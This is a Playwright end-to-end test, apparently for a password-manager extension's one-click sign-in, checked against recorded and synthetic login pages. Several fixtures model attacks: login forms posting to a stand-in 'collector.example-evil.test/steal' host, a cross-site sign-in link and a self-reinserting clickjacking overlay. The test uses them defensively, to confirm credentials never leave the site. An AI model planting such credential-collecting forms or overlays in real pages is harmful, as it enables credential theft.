import assert from 'node:assert/strict';
import { execFile } from 'node:child_process';
import { promisify } from 'node:util';
import { mkdtemp, mkdir, readFile, rm } from 'node:fs/promises';
import { randomUUID } from 'node:crypto';
import { tmpdir } from 'node:os';
import path from 'node:path';
import { chromium } from 'playwright';
import * as crypto from '@palladin/crypto';
import { createCaptureApi, allowCaptureApi } from './capture-api.mjs';
import { openNativePopup } from './native-popup.mjs';
import { cacheBustContentLoaders } from '../../scripts/cache-bust-content-loaders.mjs';

// Actual built extension, worker, closed toast and trusted Chromium clicks. First
// screens are recorded public structure where a fixture is named; transitions,
// handlers and later stages are synthetic. This is not evidence of a live login.
const api = await createCaptureApi();
const profile = await mkdtemp(path.join(tmpdir(), 'palladin-one-click-'));
const username = 'synthetic@example.test', password = 'Synthetic-one-click-password!42';
const fixture = name => readFile(`tests/fixtures/forms/${name}`, 'utf8');
const aws = await fixture('aws-root-identifier-2026-09-20/page.html');
const linkedin = await fixture('linkedin-login-2026-09-20/page.html');
const xIdentifier = await fixture('x-deferred-login-2026-09-20.html');
const xPassword = await fixture('x-deferred-password-2026-09-20.html');
const github = await fixture('github-login-2026-09-15/page.html');
const shots = process.env.ONE_CLICK_SHOTS;
let context, popup;
const requests = [];
const doc = body => `<!doctype html><meta charset="utf-8"><style>body{margin:110px 60px}input:not([type=checkbox]):not([type=hidden]){display:block;width:400px;height:40px;margin:12px 0}button{min-height:35px}</style>${body}`;
const done = '<h1>Signed in</h1><button type="button">Sign out</button>';
const totp = action => `<form method="post" action="${action}"><fieldset><legend>Authenticator code</legend>${'<input maxlength="1" inputmode="numeric">'.repeat(6)}</fieldset><button>Verify</button></form>`;
const passwordForm = action => `<form method="post" action="${action}"><input id="pw" name="password" type="password" autocomplete="current-password"><button type="submit">Sign in</button></form>`;
const loginForm = action => `<form method="post" action="${action}"><input name="u" autocomplete="username"><input name="password" type="password" autocomplete="current-password"><button type="submit">Log in</button></form>`;
const pages = {
  'console.aws.amazon.com/': doc('<a href="https://signin.aws.amazon.com/signin">Sign in to console</a>'),
  'signin.aws.amazon.com/signin': doc(`${aws}<script>document.querySelector('form').addEventListener('submit',e=>e.preventDefault());
    const next=[...document.querySelectorAll('button')].find(b=>b.textContent.trim()==='Next');next.addEventListener('click',()=>{globalThis.nextClicks=(globalThis.nextClicks||0)+1;setTimeout(()=>{document.body.innerHTML=${JSON.stringify(passwordForm('/password'))}},200)})</script>`),
  'signin.aws.amazon.com/password': doc(totp('/mfa')),
  'signin.aws.amazon.com/mfa': doc(done),
  'x.com/': doc(`${xIdentifier}<script>
    const name=document.querySelector('input[name=username_or_email]'),form=document.querySelector('form');form.addEventListener('submit',e=>e.preventDefault());
    const label=[...form.querySelectorAll('p')].filter(p=>p.textContent.trim()==='Continue');
    name.addEventListener('input',()=>setTimeout(()=>{if(form.querySelector('#go'))return;for(const p of label)p.remove();const b=document.createElement('button');b.id='go';b.type='submit';b.textContent='Continue';form.append(b);
      b.addEventListener('click',()=>{globalThis.identifierClicks=(globalThis.identifierClicks||0)+1;setTimeout(()=>{document.body.innerHTML=${JSON.stringify(xPassword)};const f=document.querySelector('form');document.querySelector('#jf-input-username').value=name.value;f.addEventListener('submit',e=>e.preventDefault());
        document.querySelector('#jf-input-password').addEventListener('input',()=>{if(f.querySelector('#go2'))return;for(const p of [...f.querySelectorAll('p')].filter(p=>/^(Continue|Log in)$/.test(p.textContent.trim())))p.remove();const c=document.createElement('button');c.id='go2';c.type='submit';c.textContent='Continue';f.append(c);c.addEventListener('click',()=>{globalThis.passwordClicks=(globalThis.passwordClicks||0)+1;document.body.innerHTML=${JSON.stringify(done)}})})},150)})},50))</script>`),
  'www.linkedin.com/': doc(`${linkedin}<script>document.querySelectorAll('button').forEach(b=>b.addEventListener('click',()=>{if(b.textContent.trim()==='Zaloguj się'){globalThis.loginClicks=(globalThis.loginClicks||0)+1;globalThis.values=[...document.querySelectorAll('input[type=email],input[type=password]')].filter(i=>i.value).map(i=>i.type);document.body.innerHTML=${JSON.stringify(done)}}else globalThis.wrongClicks=1}))</script>`),
  'github.com/': doc(`${github}<script>document.querySelector('form').method='post';document.querySelector('form').action='/session'</script>`),
  'github.com/session': doc(done),
  'wrong.example.test/': doc(loginForm('/')),
  'totp.example.test/': doc(loginForm('/otp')),
  'totp.example.test/otp': doc(`<form method="post" action="/ok"><label>Authenticator code<input id="code" maxlength="6"></label><button>Verify</button></form>`),
  'totp.example.test/ok': doc(done),
  'sms.example.test/': doc(loginForm('/otp')),
  'sms.example.test/otp': doc('<form method="post"><p>Code sent by SMS</p><input id="code" autocomplete="one-time-code"><button>Verify</button></form>'),
  'captcha.example.test/': doc(`${loginForm('/never')}<div class="g-captcha" style="width:300px;height:70px">check</div>`),
  'jump.example.test/': doc('<a href="https://jump.example-evil.test/login">Log in</a>'),
  'leak.example.test/': doc(loginForm('https://collector.example-evil.test/steal')),
  'stop.example.test/': doc(`<button id="open">Log in</button><script>document.querySelector('#open').addEventListener('click',()=>setTimeout(()=>{document.body.insertAdjacentHTML('beforeend',${JSON.stringify(loginForm('/never'))})},8000))</script>`),
  'formjump.example.test/': doc('<form method="post" action="https://collector.example-evil.test/steal"><button>Log in</button></form>'),
  'member.example.test/': doc(`<nav hidden><a href="/out">Log out</a></nav>${loginForm('/never')}`),
  'join.example.test/signup': doc(loginForm('/never')),
  // Synthetic: a sign-in link folded into a collapsed account menu, as reported on Allegro (real DOM not captured).
  'menu.example.test/': doc('<button>My account</button><div hidden><a href="/login">Log in</a></div>'),
  'menu.example.test/login': doc(loginForm('/ok')),
  'menu.example.test/ok': doc(done),
  'cover.example.test/': doc(`${loginForm('/never')}<div style="position:fixed;inset:0;z-index:2147483647;background:#0003" id="cover"></div><script>setInterval(()=>{const c=document.querySelector('#cover');if(document.documentElement.lastElementChild!==c)document.documentElement.append(c)},50)</script>`),
};
const entries = [['AWS', 'console.aws.amazon.com', true], ['X', 'x.com'], ['LinkedIn', 'www.linkedin.com'], ['GitHub', 'github.com'],
  ...['wrong', 'totp', 'sms', 'captcha', 'jump', 'leak', 'member', 'join', 'cover', 'menu', 'formjump', 'stop'].map(name => [name, `${name}.example.test`, name === 'totp'])];
try {
  const vault = api.vaults[0];
  for (const [label, host, withTotp] of entries) {
    const entryId = randomUUID();
    const secret = { schema: 'palladin.member-secret.v1', entryType: 'credential', memberLabel: label,
      agentLabel: null, discoverable: false, description: null, icon: null, color: null, agentFieldAccess: { memberLabel: 'never', agentLabel: 'never', description: 'never', icon: 'never', color: 'never',
        entryType: 'never', 'credential.username': 'never', 'credential.password': 'never', 'credential.url': 'never',
        'credential.urlDomain': 'never', 'credential.totp': 'never', notes: 'never' },
      content: { username, password, url: `https://${host}/`, urlDomain: host,
        totp: withTotp ? { secret: 'GEZDGNBVGY3TQOJQGEZDGNBVGY3TQOJQ', algorithm: 'SHA1', digits: 6, period: 30, issuer: null, account: null } : null, notes: null, customFields: [] } };
    const material = await crypto.sealCanonicalEntry({ organizationId: vault.detail.organizationId, vaultId: vault.detail.id, entryId,
      revision: '1', vaultKeyVersion: 1, vdkVersion: 1, memberKeyGeneration: 1 }, secret, vault.vaultKey, vault.discoveryKey, 1);
    vault.entries.set(entryId, { ...material, id: entryId, organizationId: vault.detail.organizationId, vaultId: vault.detail.id,
      state: 'active', currentRevision: '1', memberIndexRevision: '1', currentKeyVersion: 1, agentDiscoveryRevision: null,
      agentDiscoveryRevisionHighWatermark: '0', deliveryPolicy: 'standard', createdAt: new Date().toISOString(), updatedAt: new Date().toISOString() });
  }
  vault.detail.memberSequence = String(entries.length + 1); vault.detail.entryCount = entries.length;
  const extension = path.join(profile, 'dist/chromium');
  await promisify(execFile)(process.execPath, ['node_modules/vite/bin/vite.js', 'build', '--outDir', extension], {
    env: { ...process.env, PALLADIN_TARGET: 'chromium', PALLADIN_CHANNEL: 'production', VITE_API_URL: api.url, VITE_POSTHOG_KEY: '' }, maxBuffer: 4 * 1024 * 1024 });
  await allowCaptureApi(extension, api.url); cacheBustContentLoaders(profile, 'chromium');
  context = await chromium.launchPersistentContext(profile, { channel: 'chromium', headless: true, viewport: { width: 1200, height: 850 }, locale: 'en-US',
    args: [`--disable-extensions-except=${extension}`, `--load-extension=${extension}`, '--remote-debugging-port=0'] });
  await context.route('https://**/*', route => {
    const url = new URL(route.request().url());
    requests.push({ key: url.host + url.pathname, method: route.request().method(), body: route.request().postData() ?? '' });
    const body = pages[url.host + url.pathname];
    return body === undefined ? route.abort() : route.fulfill({ contentType: 'text/html; charset=utf-8', body });
  });
  const worker = context.serviceWorkers()[0] ?? await context.waitForEvent('serviceworker');
  const onboarding = context.pages().find(page => page.url().includes('/onboarding/'))
    ?? await context.waitForEvent('page', { predicate: page => page.url().includes('/onboarding/') });
  await onboarding.close();
  popup = await openNativePopup(worker, profile, new URL(worker.url()).host);
  await popup.click('Continue to Palladin'); await popup.waitButton('Sign in');
  const configured = await popup.configureConnection({ name: 'Synthetic capture API', apiUrl: api.url, webUrl: api.url, allowHttp: true, sharedUnlockEnabled: false });
  assert.equal(configured.ok, true, JSON.stringify(configured));
  await popup.fill('input[type="email"]', api.email); await popup.fill('input[type="password"]', api.password); await popup.click('Sign in');
  await popup.waitText('LinkedIn');
  const page = await context.newPage();
  const cdp = await context.newCDPSession(page);
  const until = async (check, label, ms = 20_000) => {
    const end = Date.now() + ms;
    while (Date.now() < end) { if (await check().catch(() => false)) return; await new Promise(done => setTimeout(done, 75)); }
    throw new Error(`timed out: ${label}; toast=${JSON.stringify(await texts().catch(() => null))}; url=${page.url()}`);
  };
  const nodes = async () => (await cdp.send('Accessibility.getFullAXTree')).nodes.filter(node => !node.ignored);
  const named = async (role, name) => (await nodes()).find(node => node.role?.value === role && node.name?.value === name);
  const texts = async () => (await nodes()).filter(node => ['button', 'StaticText', 'region', 'status'].includes(node.role?.value)).map(node => node.name?.value).slice(0, 30);
  const toast = () => named('region', 'Sign in');
  const says = text => until(async () => (await texts()).includes(text), text);
  const press = async name => {
    const matches = typeof name === 'string' ? value => value === name : value => name.test(value ?? '');
    let node;
    // Only the toast's own control: the site may carry the same caption.
    await until(async () => {
      const all = (await cdp.send('Accessibility.getFullAXTree')).nodes, region = all.find(item => !item.ignored && ((item.role?.value === 'region' && item.name?.value === 'Sign in') || (item.role?.value === 'status' && /^(Finish on this page|Opening sign-in)/.test(item.name?.value ?? ''))));
      if (!region) return false;
      const inside = new Set([region.nodeId]);
      for (let changed = true; changed;) { changed = false; for (const item of all) if (!inside.has(item.nodeId) && inside.has(item.parentId)) { inside.add(item.nodeId); changed = true; } }
      node = all.find(item => inside.has(item.nodeId) && item.role?.value === 'button' && matches(item.name?.value));
      return Boolean(node);
    }, `toast button ${name}`);
    await page.waitForTimeout(650);
    const { model } = await cdp.send('DOM.getBoxModel', { backendNodeId: node.backendDOMNodeId });
    await page.mouse.click((model.content[0] + model.content[4]) / 2, (model.content[1] + model.content[5]) / 2);
  };
  const signIn = async url => { requests.length = 0; await page.goto(url); await until(async () => Boolean(await toast()), `toast on ${url}`); await press('Sign in'); };
  const posts = key => requests.filter(item => item.key === key && item.method === 'POST');
  const gone = () => until(async () => await page.locator('palladin-capture').count() === 0, 'toast hidden');
  const pass = text => console.log(`PASS: ${text}`);
  if (shots) {
    await mkdir(shots, { recursive: true });
    for (const theme of ['light', 'dark']) {
      await page.emulateMedia({ colorScheme: theme }); await page.goto('https://github.com/');
      await until(async () => Boolean(await toast()), 'screenshot toast'); await page.mouse.move(600, 48); await page.waitForTimeout(400);
      await page.screenshot({ path: path.join(shots, `${theme}.png`), clip: { x: 350, y: 0, width: 500, height: 110 } });
    }
    await page.emulateMedia({ colorScheme: 'light' });
  }

  const scenarios = {
    async aws() {
      await signIn('https://console.aws.amazon.com/');
      await until(() => page.evaluate(() => document.body.textContent.includes('Signed in')), 'AWS home to MFA');
      assert.equal(posts('signin.aws.amazon.com/password').length, 1);
      assert.equal(new URLSearchParams(posts('signin.aws.amazon.com/password')[0].body).get('password'), password);
      assert.equal(posts('signin.aws.amazon.com/mfa').length, 1);
      await gone(); pass('AWS: home link, related sign-in host, recorded identifier, password, six-field TOTP, each submitted once');
    },
    async x() {
      await signIn('https://x.com/');
      await until(() => page.evaluate(() => globalThis.passwordClicks === 1), 'X both stages');
      assert.equal(await page.evaluate(() => globalThis.identifierClicks), 1); await gone();
      pass('X: recorded identifier with a late Continue button, then recorded password stage');
    },
    async linkedin() {
      await signIn('https://www.linkedin.com/');
      await until(() => page.evaluate(() => globalThis.loginClicks === 1), 'LinkedIn');
      assert.equal(await page.evaluate(() => globalThis.wrongClicks), undefined);
      assert.deepEqual(await page.evaluate(() => globalThis.values), ['email', 'password']); await gone(); pass('LinkedIn: recorded form, only the password sign-in action');
    },
    async github() {
      await signIn('https://github.com/'); await until(() => Promise.resolve(posts('github.com/session').length === 1), 'GitHub post');
      await gone(); pass('GitHub: recorded form');
    },
    async totp() {
      await signIn('https://totp.example.test/'); await until(() => Promise.resolve(posts('totp.example.test/ok').length === 1), 'TOTP'); await gone();
      pass('single-field TOTP after a full reload');
    },
    async wrong() {
      await signIn('https://wrong.example.test/'); await says('Finish on this page');
      assert.equal(posts('wrong.example.test/').length, 1); await page.waitForTimeout(1_000);
      assert.equal(posts('wrong.example.test/').length, 1); pass('rejected password is submitted exactly once');
    },
    async sms() { await signIn('https://sms.example.test/'); await says('Enter the verification code'); assert.equal(await page.locator('#code').inputValue(), ''); pass('SMS is handed to the user'); },
    async captcha() {
      await signIn('https://captcha.example.test/'); await says('Confirm that you are not a robot');
      assert.equal(requests.filter(item => item.key.endsWith('/never')).length, 0); pass('CAPTCHA is handed to the user without a submission');
    },
    async crossSite() {
      await signIn('https://jump.example.test/'); await says('Finish on this page');
      assert.equal(requests.some(item => item.key.includes('example-evil')), false); pass('never follows a sign-in link to another site');
    },
    async stop() {
      await signIn('https://stop.example.test/'); await says('Stop'); await press('Stop');
      await until(async () => Boolean(await toast()) && !(await texts()).includes('Stop'), 'ready toast after Stop', 4_000);
      pass('Stop returns the toast to its ready state');
    },
    async formJump() {
      await signIn('https://formjump.example.test/'); await says('Finish on this page');
      assert.equal(requests.some(item => item.key.includes('example-evil')), false); pass('never clicks a sign-in control whose form posts to another site');
    },
    async leak() {
      await signIn('https://leak.example.test/'); await says('Finish on this page');
      assert.equal(requests.some(item => item.key.includes('example-evil')), false); pass('never submits a form whose action is another site');
    },
    async menu() {
      await signIn('https://menu.example.test/'); await until(() => Promise.resolve(posts('menu.example.test/ok').length === 1), 'folded menu sign-in');
      await gone(); pass('a sign-in link folded into a collapsed account menu');
    },
    async quiet() {
      for (const url of ['https://member.example.test/', 'https://join.example.test/signup']) {
        await page.goto(url); await page.waitForTimeout(3_000); assert.equal(await toast(), undefined, url);
      }
      pass('no toast on a signed-in page or a registration URL');
    },
    async dismissed() {
      await page.goto('https://github.com/'); await until(async () => Boolean(await toast()), 'toast'); await press('Close sign-in suggestion'); await gone();
      await page.reload(); await page.waitForTimeout(3_000); assert.equal(await toast(), undefined); pass('a closed toast stays hidden in the tab after reload');
    },
    async typing() {
      const other = await context.newPage(); await other.goto('https://totp.example.test/'); const s = await context.newCDPSession(other);
      const shown = async () => (await s.send('Accessibility.getFullAXTree')).nodes.some(n => n.role?.value === 'region' && n.name?.value === 'Sign in');
      await until(shown, 'toast'); await other.locator('[name=u]').fill('me@example.test'); await until(async () => !await shown(), 'typing hides', 3_000);
      await other.waitForTimeout(1_500); assert.equal(await shown(), false); await other.close(); pass('typing a login by hand hides the toast');
    },
    async covered() {
      await page.goto('https://cover.example.test/'); await until(async () => Boolean(await toast()), 'toast'); requests.length = 0; await press('Sign in');
      await page.waitForTimeout(1_500); assert.equal(requests.length, 0); assert.ok(await toast()); pass('a click through a page overlay does nothing');
    },
    async never() {
      const shown = async target => (await (await context.newCDPSession(target)).send('Accessibility.getFullAXTree')).nodes.some(n => n.role?.value === 'region' && n.name?.value === 'Sign in');
      await page.goto('https://totp.example.test/'); await until(async () => Boolean(await toast()), 'toast');
      await press(/^Change account: /); await press(/^Never on this site/); await gone();
      const other = await context.newPage(); await other.goto('https://totp.example.test/'); await other.waitForTimeout(3_000);
      assert.equal(await shown(other), false, 'muted site');
      assert.deepEqual(await worker.evaluate(async () => (await chrome.storage.local.get('palladin.one-click.muted-hosts.v1'))['palladin.one-click.muted-hosts.v1']), ['totp.example.test']);
      await worker.evaluate(() => chrome.storage.local.set({ 'palladin.one-click.muted-hosts.v1': [] }));
      await until(() => shown(other), 'toast after removing the ignored site');
      await worker.evaluate(() => chrome.storage.local.set({ 'palladin.one-click.disabled.v1': true }));
      await until(async () => !await shown(other), 'turned off everywhere', 3_000);
      await other.reload(); await other.waitForTimeout(3_000); assert.equal(await shown(other), false, 'turned off');
      await worker.evaluate(() => chrome.storage.local.remove('palladin.one-click.disabled.v1')); await other.close();
      pass('never on this site, removing it in settings, and turning the feature off');
    },
    async countdown() {
      const other = await context.newPage(); await other.goto('https://x.com/'); const s = await context.newCDPSession(other);
      const shown = async () => (await s.send('Accessibility.getFullAXTree')).nodes.some(n => n.role?.value === 'region' && n.name?.value === 'Sign in');
      await until(shown, 'toast'); await other.mouse.move(5, 800); await until(async () => !await shown(), 'countdown hides', 16_000);
      assert.equal(await other.evaluate(() => globalThis.identifierClicks), undefined); await other.close(); pass('countdown only hides');
    },
  };
  const only = process.argv[2]?.split(',');
  const failed = [];
  for (const [name, run] of Object.entries(scenarios)) {
    if (only && !only.includes(name)) continue;
    // A finished scenario may still be committing its last navigation.
    await page.waitForLoadState('load').catch(() => undefined); await page.waitForTimeout(500);
    await page.goto('about:blank').catch(() => page.waitForTimeout(1_000));
    try { await run(); } catch (error) { failed.push(name); console.log(`FAIL: ${name}: ${error.message.slice(0, 700)}`); }
  }
  assert.deepEqual(api.errors, []);
  assert.deepEqual(failed, []);
} finally {
  popup?.close(); await context?.close(); await api.close(); await rm(profile, { recursive: true, force: true });
}
